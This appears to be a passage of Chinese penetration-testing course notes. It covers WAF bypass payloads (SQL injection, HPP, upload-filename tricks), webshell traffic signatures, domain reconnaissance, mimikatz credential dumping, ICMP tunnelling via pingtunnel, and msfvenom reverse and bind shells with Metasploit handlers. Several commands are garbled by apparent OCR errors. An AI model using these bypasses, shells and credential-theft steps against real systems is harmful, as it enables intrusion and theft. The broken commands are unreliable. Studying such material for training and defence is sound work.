<h4 id="章节点：-8"><a href="#章节点：-8" class="headerlink" title="章节点："></a>章节点：</h4><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段。</p>
<p>可以分为下面三种检测的，即WAF、入侵检测平台、威胁感知平台。检测的技术可以分为正则匹配、机器语言、行为分析。一般那种开源的就是用的正则匹配，或者说一些比较垃圾的项目，因为用正则匹配的话比较容易绕过，使用加密、编码、分段等操作即可绕过。这个分段就是把一些特征流量分段发送，比如他检测POST这个东西，你可以中间加点，然后分成几个去表示。而行为分析则不看你过滤的函数，而是看这个代码的最终行为是什么，然后进行分析，如果过探测到行为比较危险就会拦截，而这个机器语言也是比较高级的东西，小迪也没解释清。一般商业的都是行为分析和机器语言去检测，开源的是正则。最终的发展方向呢也是往机器语言和行为分析发展。</p>
<blockquote>
<p>正则表达式是 WAF 中最常用的技术之一，可用于实现基于模式匹配的规则和策略。</p>
<p>机器语言是计算机能够理解和执行的指令集，与高级编程语言不同，它使用二进制代码来表示操作和数据。在 WAF<br>中，机器语言可能用于处理和分析网络流量，以及执行特定的安全策略和行为分析。</p>
<p>行为分析是一种安全技术，旨在识别恶意活动和攻击，例如 SQL 注入、跨站脚本攻击等。在 WAF 中，行为分析可以通过检查 Web<br>请求的属性、参数、来源 IP 等信息，从而确定该请求是否是合法和安全的</p>
</blockquote>
<h4 id="演示案例：-48"><a href="#演示案例：-48" class="headerlink" title="演示案例："></a>演示案例：</h4><p>菜刀-流量&amp;绕过&amp;特征&amp;检测<br>waf告警日志中显示策略匹配到eval post</p>
<p>通过wireshark抓包也可以看到数据包内容</p>
<p>传入的值中xx变量经过php运行结果为base_64decode</p>
<p>1、版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2014$P0ST=$REQUEST2016可以</span><br></pre></td></tr></table></figure>

<p>2、特征：<br>数据包流量特征：<br>1,请求包，中：ua头为百度爬虫<br>2,请求体中存在eval,base64等特征字符<br>3,请求体中传递的payload为base64编码，并且存在面定的<br>QGluaV9zZXQolmRpc3BsYXIfZXJyb3JzliwiMClpO0BzZXRfdGItZV9saW1pdCgwKTtpZih<br>QSFBfVkVSUOIPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1IKDApO307<br>ZWNobygiWEBZlik7J</p>
<p>冰蝎-流量&amp;绕过&amp;特征&amp;检测<br>哥斯拉-流量&amp;绕过&amp;特征&amp;检测</p>
<p>冰竭流量&amp;绕过&amp;特征&amp;检测</p>
<p>请求正文全部为AES加密（AES加密的特则含有&#x2F;&#x2F;&#x2F;，大小写混杂，base64加密含有&#x3D;）AES加密需要知道密匙、偏移量、加密模式等</p>
<p>1、介绍<br>冰蝎利用了服务器端的脚本语言加产功能，通讯的过程中，<br>消息体内容采用AES加密，基于特征值检测的安全产品无法查出。<br>2、通讯<br>以代码Key为密匙的AES加密解密过程<br>3、<br>特征：<br>1、User-agent:代码中定义<br>2、Pragma:no-cache<br>3.Content-Type:application&#x2F;x-www-form-urlencoded<br>4、Accept<br>text&#x2F;html,application&#x2F;xhtml+xml.application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng.*&#x2F;;q&#x3D;0.8.a<br>5.Accept-Encoding:gzip,deflate,br<br>6 Accept-Language:zh-CN,zh;q&#x3D;0.9,en-US:q&#x3D;0.8,en;q&#x3D;0.7</p>
<p>哥斯拉流量&amp;绕过&amp;特征&amp;检测<br>1、通讯加密见图<br>2、特征：<br>1.User-Agent Mozilla&#x2F;5.0 (Windows NT 10.0;Win64;x64:rv:84.0)Gecko&#x2F;20100101<br>Firefox&#x2F;84.0<br>2.Accept text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,&#x2F;:q&#x3D;0.8<br>3.Accept-Language:zh-CN,zh;q&#x3D;0.8,zh-TW:q&#x3D;0.7,zh-HK:q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>4、Cookie:PHPSESSID&#x3D;ut2a51prs0470jvfe2q502o44 cookiet最后面存在-个”，”</p>
<h4 id="拓展-冰蝎流量特征"><a href="#拓展-冰蝎流量特征" class="headerlink" title="拓展 冰蝎流量特征"></a>拓展 冰蝎流量特征</h4><p>冰蝎<br>冰蝎其最大特点就是对交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测<br>1、通过密钥协商的过程中的一些特征来检测其他<br>老版冰蝎工具在连接Webshell的时候会存在一个密钥协商的过程，这个过程是纯明文的数据交换，冰蝎存在这样的特征：发起一共两次的密钥协商，通过比较两次密钥协商的返回包中内容的不同部分来获取其中的密钥。<br>在这个协商过程中，防护设备可以结合URL、请求包和返回包的内容以及头部信息来综合进行判断，这种类型检测的优势是这部分的流程是冰蝎内置的实现，攻击者不太好进行修改绕过。而劣势是在大流量的环境下很容易引起大量的误报。<br>2、通过Shell交互过程中的HTTP请求特征来检测<br>冰蝎在发送HTTP请求时存在一些特征，例如其工具中内置了17个User-Agent头，在用户没有自定义的情况下会随机选择一个发送。但是这些User-Agent头大部分是一些老版本的浏览器或设备。这个类型检测的优势是检测方式比较简单，但是在大流量的环境下很容易引起误报，一般使用多个特征相结合的方法来改善误报的情况，并且这部分的特征通常是一些弱特征，攻击者可以通过定制请求头、使用代理等方式修改冰蝎的请求包很轻易的来绕过这类的检测。<br>3、通过Webshell上传时的流量特征来检测<br>在真实的攻击场景下，攻击者通常是通过文件上传、文件写入等方式来写入冰蝎的Webshell，所以流量设备也可以通过检测攻击场景的数据包来发现冰蝎的存在。这部分的流量形式主要取决于Web应用，是攻击者不好控制的，而且通常都是以明文形式进行传输，所以比较易于检测。<br>但是这种检测方式在遇到非文件上传等漏洞时，有可能无法捕捉到Webshell的特征。<br>冰蝎3.0<br>从防守方的角度看，这些改动中对防御设备影响最大的是第1点，也就是说，3.0版本的冰蝎不在有密钥协商的过程，从原理上直接绕过了大量流量检测设备（大部分设备是通过握手的行为来检测冰蝎的流量）</p>
<p>蚁剑<br>1、编码器改造 蚁剑在数据包中实际上是将解码函数一同发送到服务端，那几个解码函数是没法加密的，所以产生一个很明显 的流量特征，蚁剑也支持使用者自定义编码器和解码器<br>2、请求头修改 蚁剑默认的数据包里都携带了特别明显的请求头信息：User-Agent: antSword&#x2F;v2.1，对WAF来说这简直 是自报家门</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>冰蝎改造将动态的AES密钥写死在webshell里，可以减少很多特征。<br>蚁剑就是将解码函数写死在webshell 里，也可以有效绕过WAF检测</p>
<h1 id="第七十九天-WAF攻防-漏洞发现-协议-代理池-Goby-AWVS-Xray"><a href="#第七十九天-WAF攻防-漏洞发现-协议-代理池-Goby-AWVS-Xray" class="headerlink" title="第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray"></a>第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray</h1><h4 id="知识点：-55"><a href="#知识点：-55" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Http&#x2F;s&amp;Sock5协议<br>2、Awvs Xray&amp;Goby代理<br>3、Pxoxifier进程代理使用<br>4、Safedog&amp;BT&amp;Aliyun防护</p>
<h4 id="演示案例：-49"><a href="#演示案例：-49" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Awws漏扫-Sadedog-白名单-内置<br>Awws漏扫-BT&amp;Aliyun-代理池-内置<br>Xray漏扫-BT&amp;Aliyun-Proxifier-.进程<br>Goby漏扫-BT&amp;Aliyun-Socket5-内置</p>
<p>在漏洞发现中，WAF会对三个方向进行过滤拦截：<br>1、速度流量问题<br>2、工具的指纹被识别<br>3、工具的检测Poc或Payload</p>
<p>Awvs漏扫-Sadedog-白名单-内置<br>加入白名单扫描，防Safedog拉黑IP</p>
<p>Awws漏扫-BT&amp;Aliyun-代理池-内置</p>
<p>Xray漏扫-BT&amp;Aliyun-Proxifier-.进程</p>
<p>proxifier添加代理服务器</p>
<p>添加代理规则 使得xray流量经过代理服务器访问目标站点</p>
<p>Goby漏扫-BT&amp;Aliyun-Socket5-内置</p>
<p>对于不通过https对网站或操作系统进行信息收集的程序可以使用socket5代理进行流量转发</p>
<p>sqlmay设置代理设置随机UA头</p>
<h1 id="第八十天-WAF攻防-漏洞利用-HPP污染-分块传输-垃圾数据"><a href="#第八十天-WAF攻防-漏洞利用-HPP污染-分块传输-垃圾数据" class="headerlink" title="第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据"></a>第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据</h1><h4 id="参考点："><a href="#参考点：" class="headerlink" title="参考点："></a>参考点：</h4><p>#将MySQL注入函数分为几类<br>拆分字符串函数：mid、1eft、1pad等<br>编码函数：ord、hex、a3ci等<br>运算函数：±*&#x2F;&amp;^！1 ike rlike reg等<br>空格替换部分：09、0a、0b、0c、0d等<br>关键数据函数：user（）、version（）、database（）等<br>然后将这些不同类型的函数组合拼接在一起</p>
<p>上传参数名解析：明确哪些东西能修政？<br>Content-Di3 position:一般可更改<br>name:表单参数值，不能更改<br>filename:文件名，可以更改<br>Content-Type:文件MIME,视情况更改</p>
<h4 id="演示案例：-50"><a href="#演示案例：-50" class="headerlink" title="演示案例："></a>演示案例：</h4><p>安全狗-SQL注入&amp;文件上传-知识点<br>安全狗-文件包含&amp;代码执行-知识点<br>BT&amp;Aliyun-SQL注入&amp;文件上传-知识点<br>BT&amp;Aliyun-文件包含&amp;代码执行-知识点</p>
<p>安全狗-SQL注入&amp;文件上传-知识点</p>
<p>SQL注入 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a><br>关键字替换<br>使用like 代替 and<br>更换提交方式：<br>POST id&#x3D;-1 union select 1,2,3–+</p>
<p>模拟文件上传传递数据<br>分块传输：更改数据请求格式<br>前提提交方式必须为POST<br><a target="_blank" rel="noopener" href="https://github.com/cOny1/chunked-coding-converter">https://github.com/cOny1/chunked-coding-converter</a><br>HPP参数污染：id&#x3D;1&#x2F;**&amp;id&#x3D;-1号20 union号203e1ect号201,2,3号23*&#x2F;</p>
<p>文件上传：换行解析&amp;垃圾溢出&amp;00干扰&amp;&#x3D;符号干扰&amp;参数模拟<br>filename&#x3D;a.php<br>filename&#x3D;”a.php<br>filename&#x3D;“a.php号%00”<br>垃圾数据；filename&#x3D;“a.php”<br>无限filename;filename&#x3D;“a,php”<br>filename&#x3D;&#x3D;“a.php”<br>filename&#x3D;“name&#x3D;’uploadfile.php”6</p>
<p>filename&#x3D;“Content-Disposition:form-data.php”<br>filename&#x3D;&#x3D;“a.php”</p>
<p>BT&amp;Aliyun-文件包含&amp;代码执行-知识点<br><a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>python xsstrike.py -u<br>“<a target="_blank" rel="noopener" href="http://test.xiaodi8.com/pikachu/vul/xss/xss">http://test.xiaodi8.com/pikachu/vul/xss/xss</a> reflected get.php?mes<br>sage&#x3D;1&amp;submit&#x3D;submit”–proxy<br>txt&#x3D;Sy&#x3D;str replace(‘x’,‘’,‘pxhpxinxfo（）’);assert ($y);&amp;submit&#x3D;8688<br>F응90응E4용BA응A4<br>文件包含：没什么好说的就这几种<br>…·&#x2F;…1等</p>
<p>安全狗：<br>注入ss文件上传拦截<br>rce文件包含等其他不拦截<br>宝塔：<br>注入上传拦截<br>rce文件包含Xss等其他不拦截<br>其中拦截的是关键字<br>aliyun<br>拦截的CC速度和后门信息收集和权限维持阶段拦截<br>漏洞利用他不拦截默认的版本（升级版本没测试）</p>
<p>由于这段时间去打春秋云镜的内网靶场去了，所以就先看内网的了，后边就是先从内网的知识点开始。</p>
<h1 id="第122天：内网安全-域信息收集-应用网络凭据-CS插件-Adfind-BloodHound"><a href="#第122天：内网安全-域信息收集-应用网络凭据-CS插件-Adfind-BloodHound" class="headerlink" title="第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound"></a>第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound</h1><h4 id="知识点：-56"><a href="#知识点：-56" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、域产生原因</p>
<p>2、内网域的区别</p>
<p>3、如何判断在域内</p>
<p>4、域内常见信息收集</p>
<p>5、域内自动化工具收集</p>
<p>-局域网&amp;工作组&amp;域环境区别</p>
<p>-域环境信息收集-应用&amp;网络&amp;服务&amp;凭据等</p>
<p>-自动化工具使用-CS 插件&amp;Adfind&amp;BloodHound</p>
<p>0x01</p>
<p>一个具有一定规模的企业，每天都可能面临员工入职和离职，因此网络管理部门经常需要</p>
<p>对域成员主机进行格式化消除磁盘的文件，然后重装系统及软件，以提供给新员工使用；</p>
<p>因此，为了便于后期交接，大多网络管理员会做好一个系统镜像盘，统一安装所有的电</p>
<p>脑，并且在安装的时候设置惯用、甚至统一的密码。</p>
<p>0x02</p>
<p>因此，域中的计算机本地管理员账号，极有可能能够登陆域中较多的计算机，本地管理员</p>
<p>的密码在服务器上后期修改的概率，远低于在个人办公电脑上的概率，而域用户权限是较</p>
<p>低的，是无法在域成员主机上安装软件的，这将会发生下面的一幕：</p>
<p>某个域用户需要使用 viso 软件进行绘图操作，于是联系网络管理员进行安装，网络管理</p>
<p>员采用域管理员身份登录了域成员主机，并帮助其安装了 viso 软件，于是这个有计算机</p>
<p>基础的员工，切换身份登录到了本地计算机的管理员，后执行 mimikatz，从内存当中抓</p>
<p>取了域管理员的密码，便成功的控制了整个域。</p>
<p>0x03</p>
<p>因此，域渗透的思路就是：通过域成员主机，定位出域控制器 IP 及域管理员账号，利用</p>
<p>域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，</p>
<p>定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进</p>
<p>而拿下域控制器、渗透整个内网。</p>
<p>–当前机器角色的判断</p>
<p>–当前机器网络环境判断</p>
<p>–当前机器角色功能判断</p>
<p>网络环境-局域网&amp;工作组&amp;域环境</p>
<p>机器角色-个人 PC&amp;文件服务器&amp;邮件服务器等</p>
<p>角色功能-任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p>
<p>网络环境-局域网-工作组&amp;域环境</p>
<p>机器角色-个人PC&amp;文件服务器&amp;邮件服务器等</p>
<p>角色功能-任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p>
<h4 id="演示案例：-51"><a href="#演示案例：-51" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 常规信息类收集-应用&amp;服务&amp;权限等</p>
<p> 架构信息类收集-网络&amp;用户&amp;域控等</p>
<p> 关键信息类收集-密码&amp;凭据&amp;口令等</p>
<p> 自动化工具探针-插件&amp;Adfind&amp;BloodHound</p>
<p>#常规信息类收集-应用&amp;服务&amp;权限等</p>
<p>更多其他收集见上图命令表</p>
<p>systeminfo 详细信息</p>
<p>netstat -ano 端口列表</p>
<p>route print 路由表</p>
<p>net start 启动服务</p>
<p>tasklist 进程列表</p>
<p>schtasks 计划任务</p>
<p>ipconfig &#x2F;all 判断存在域</p>
<p>net view &#x2F;domain 判断存在域</p>
<p>net time &#x2F;domain 判断主域</p>
<p>netstat -ano 当前网络端口开放</p>
<p>nslookup 域名 追踪来源地址</p>
<p>wmic service list brief 查询本机服务</p>
<p>net config workstation 查询当前登录域及登录用户信息</p>
<p>wmic startup get command,caption 查看已启动的程序信息</p>
<p>#架构信息类收集-网络&amp;用户&amp;域控等</p>
<p>net view &#x2F;domain 查询域列表</p>
<p>net time&#x2F;domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦</p>
<p>用来判 断主域，主域一般用做时间服务器</p>
<p>net localgroup administrators 本机管理员【通常含有域用户】</p>
<p>net user &#x2F;domain 查询域用户(当前域)</p>
<p>net group &#x2F;domain 查询域工作组</p>
<p>net group “domain computers” &#x2F;domain 查看加入域的所有计算机名</p>
<p>net group “domain admins” &#x2F;domain 查询域管理员用户组和域管用户</p>
<p>net localgroup administrators &#x2F;domain 查看域管理员</p>
<p>net group “domain controllers” &#x2F;domain 查看域控</p>
<p>net accounts &#x2F;domain 查看域密码策略</p>
<p>#关键信息类收集-密码&amp;凭据&amp;口令等</p>
<p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p>
<p>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)</p>
<p>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS 插件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p><a target="_blank" rel="noopener" href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p>
<p>主要介绍一下域是什么，有什么用，怎么去利用</p>
<h1 id="第123天：内网安全-域防火墙-入站出站规则-不出网隧道上线-组策略对象同步"><a href="#第123天：内网安全-域防火墙-入站出站规则-不出网隧道上线-组策略对象同步" class="headerlink" title="第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步"></a>第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步</h1><h4 id="知识点：-57"><a href="#知识点：-57" class="headerlink" title="#知识点："></a>#知识点：</h4><p>0、防火墙组策略对象         入规则严格，出规则宽松</p>
<p>1、OSI 七层协议模型</p>
<p>2、正反向监听器说明        我去连接你为正向</p>
<p>3、隧道技术分层协议</p>
<p>4、CS&amp;MSF&amp;控制上线</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>我个人使用的是stowaway，这里工具有很多，自己选择即可</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<h4 id="系列点："><a href="#系列点：" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<h4 id="演示案例：-52"><a href="#演示案例：-52" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 单机-防火墙-限制端口出入站</p>
<p> 单机-防火墙-限制协议出入站</p>
<p> 域控-防火墙-组策略对象同步</p>
<p> 域控-防火墙-组策略不出网上线</p>
<h4 id="单机-防火墙-限制端口出入站"><a href="#单机-防火墙-限制端口出入站" class="headerlink" title="#单机-防火墙-限制端口出入站"></a>#单机-防火墙-限制端口出入站</h4><p>熟悉常见主机配置不出网的方式</p>
<p>1、入站&amp;出站&amp;连接安全</p>
<p>2、域&amp;专用&amp;公网&amp;状态</p>
<p>3、阻止&amp;允许&amp;其他配置</p>
<h4 id="单机-防火墙-限制协议出入站"><a href="#单机-防火墙-限制协议出入站" class="headerlink" title="#单机-防火墙-限制协议出入站"></a>#单机-防火墙-限制协议出入站</h4><p>熟悉常见主机配置不出网的方式</p>
<p>1、程序&amp;端口&amp;预定义&amp;自定义</p>
<p>2、协议&amp;TCP&amp;UDP&amp;ICMP&amp;L2TP 等</p>
<h4 id="域控-防火墙-组策略对象同步"><a href="#域控-防火墙-组策略对象同步" class="headerlink" title="#域控-防火墙-组策略对象同步"></a>#域控-防火墙-组策略对象同步</h4><p>熟悉常见主机配置不出网的操作流程</p>
<p>操作：组策略管理-域-创建 GPO 链接-防火墙设置</p>
<p>更新策略：强制&amp;命令&amp;重启</p>
<p>命令：gpupdate&#x2F;force</p>
<p>#域控-防火墙-组策略不出网上线</p>
<p>背景介绍：域控通过组策略设置防火墙规则同步后，域内用户主机被限制 TCP 出网，其</p>
<p>中规则为出站规则，安全研究者通过入站取得 SHELL 权限，需要对其进行上线控制。</p>
<p>思路：正向连接&amp;隧道技术</p>
<p>如果是入站被限制呢？反向连接&amp;隧道技术也可以解决（前提看限制的多不多）</p>
<p>ICMP 协议项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>1、CS-ICMP-上线</p>
<p>VPS:</p>
<p>.&#x2F;pingtunnel -type server</p>
<p>肉鸡：(管理器运行)</p>
<p>pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t </p>
<p>192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1</p>
<p>CS:</p>
<p>监听器 1：127.0.0.1 6666</p>
<p>监听器 2：192.168.46.66 7777</p>
<p>生成监听器 1 的 Stager 后门肉鸡执行</p>
<p>2、MSF上线<br>生成后门:<br>msfvenom p windows&#x2F;meterpreter&#x2F;reverse tcp HOST&#x3D;127.0.0.1<br>LPORT&#x3D;3333 -f exe &gt; xd.exe<br>MS&#x3D;启动监听:<br>msfconso1e<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tep<br>get lhest 0.0.0.0<br>set lport 4444<br>exploit<br>a11开启隧道:<br>&#x2F;pingtunnel -type server</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/42d2d6e5485a227110735fafee311311--dfb4--image-20240511083406029.png" alt="image-20240511083406029"></p>
<h1 id="第124天：内网安全-代理Socks协议-路由不出网-后渗透通讯-CS-MSF控制上线"><a href="#第124天：内网安全-代理Socks协议-路由不出网-后渗透通讯-CS-MSF控制上线" class="headerlink" title="第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线"></a>第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线</h1><h4 id="知识点：-58"><a href="#知识点：-58" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、代理软件使用-Win&amp;Linux</p>
<p>2、代理协议使用-Socks4&#x2F;5</p>
<p>3、CS&amp;MSF-网络通讯&amp;控制上线</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<h4 id="系列点：-1"><a href="#系列点：-1" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理         </p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/67e4aaa79b879330b771633d8535143b--cf65--image-20240511083808897.png" alt="image-20240511083808897"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/6344854276615d72961db5c984fa1edc--d69d--image-20240511084449143.png" alt="image-20240511084449143"></p>
<h4 id="演示案例：-53"><a href="#演示案例：-53" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 网络通讯-MSF&amp;CS-路由添加&amp;节点建立</p>
<p> 控制上线-MSF&amp;CS-协议生成&amp;正反连接</p>
<h4 id="网络通讯-MSF-CS-路由添加-节点建立"><a href="#网络通讯-MSF-CS-路由添加-节点建立" class="headerlink" title="#网络通讯-MSF&amp;CS-路由添加&amp;节点建立"></a>#网络通讯-MSF&amp;CS-路由添加&amp;节点建立</h4><h4 id="控制上线-MSF-CS-协议生成-正反连接"><a href="#控制上线-MSF-CS-协议生成-正反连接" class="headerlink" title="#控制上线-MSF&amp;CS-协议生成&amp;正反连接"></a>#控制上线-MSF&amp;CS-协议生成&amp;正反连接</h4><p>代理协议：</p>
<p>SOCKS4&#x2F;5</p>
<p>代理软件：</p>
<p>SocksCap Proxifier ProxyChains 等</p>
<p>MSF 通讯</p>
<p>1、添加路由 限于 MSF</p>
<p>查看路由信息</p>
<p>run autoroute -p</p>
<p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p>
<p>添加指定路由，1 是接收的 session 编号</p>
<p>route add 192.168.11.0 255.255.255.0 1</p>
<p>2、Sock 代理 全局同用</p>
<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>
<p>set srvhost 0.0.0.0</p>
<p>set srvport 1115</p>
<p>run</p>
<p>启用代理软件配置 Sock5 代理</p>
<p>CS 通讯</p>
<p>命令：socks 59578</p>
<p>操作：代理转发-Socks 代理</p>
<p>MSF 控制上线-正向连接</p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;3333 </p>
<p>-f exe &gt; bd.exe</p>
<p>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
<p>set rhost 192.168.11.129</p>
<p>set lport 3333</p>
<p>run</p>
<p>CS 控制上线-正向连接</p>
<p>监听器：bind_tcp port</p>
<p>命令：connect ip port</p>
<p>实验 2：二层（后续多层操作一致）</p>
<p>代理软件犖镫澌<br>Sockscap Proxifier Proxychains等</p>
<p>MSF通讯<br>1、添加路由 限于MSF<br>查看路由信息<br>run autoroute -p<br>run post&#x2F;multi&#x2F;manage&#x2F;autorcute<br>添加指定路由，1是接收的session编号<br>route add 192.168 11.0 255.255.255.0 1<br>2、sock代理 全局同用<br>use auxiliary&#x2F;server&#x2F;socks_proxy<br>set srvhost 0.0.0.0<br>set srvport 1115<br>run<br>启用代理软件配置Socks5代理<br>cs通讯<br>命令:Socks5 59578<br>操作:代理转发-Socks代理<br>MSE控制上线-正向连接<br>msfvenom p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 PORT&#x3D;3333</p>
<p>-f exe &gt; bd.exe<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set rhost 192.168.11.129<br>set lport 3333<br>run<br>cs控制上线-正向连接<br>监听器:bind tcp port<br>命令:connect ip port</p>
<h1 id="第125天：内网安全-隧道技术-SMB-ICMP-正反向连接-防火墙出入规则上线"><a href="#第125天：内网安全-隧道技术-SMB-ICMP-正反向连接-防火墙出入规则上线" class="headerlink" title="第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线"></a>第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线</h1><h4 id="知识点：-59"><a href="#知识点：-59" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、入站规则不出网上线方案</p>
<p>2、出站规则不出网上线方案</p>
<p>3、规则-隧道技术-SMB&amp;ICMP</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<h4 id="系列点：-2"><a href="#系列点：-2" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/dd504fe86d60d41e5d808e194e458ce4--d9ee--image-20240511090624508.png" alt="image-20240511090624508"></p>
<h4 id="演示案例：-54"><a href="#演示案例：-54" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 不出网-控制上线-CS-反向连接</p>
<p> 不出网-控制上线-CS-SMB 隧道</p>
<p> 不出网-控制上线-CS-ICMP 隧道</p>
<p> 不出网-控制上线-CS-关闭防火墙</p>
<p><strong>windows是建立SMB通道 ，linux建立SSH通道</strong></p>
<p><strong>怎么知道对方是出站限制还是入站限制呢？</strong><br>上传正向和反向木马进行测试</p>
<p><strong>不出网-控制上线-CS-ICMP隧道</strong><br>使用icmp隧道绕过出站限制，细节见上一章内容<br>注：win10作为pingtunnel服务端，其他操作类似<br>……</p>
<p><strong>不出网-控制上线-CS-关闭防火墙</strong><br>如果取得目标机的高权限且，修改防火墙规则，关闭防火墙，以及替换防火墙规则里程序。<br>适用于：<br>1.单纯的内网环境(类似本次实验环境)，不是域环境<br>2.单纯的内网域环境(但是域控DC没有设置组策略防火墙同步)</p>
<p>入站过滤上线：</p>
<p>1、隧道技术硬刚</p>
<p>2、反向连接跳过</p>
<p>3、关闭&amp;删除&amp;替换</p>
<p>适用利用入站通行拿到的高权限</p>
<p>出站过滤上线：</p>
<p>1、隧道技术硬刚</p>
<p>2、正向连接跳过</p>
<p>3、关闭&amp;删除&amp;替换</p>
<p>适用利用入站通行拿到的高权限</p>
<p>隧道技术上线：</p>
<p>HTTP&#x2F;S &amp; DNS &amp; SSH &amp; ICMP &amp; SMB &amp; 协议穿透等</p>
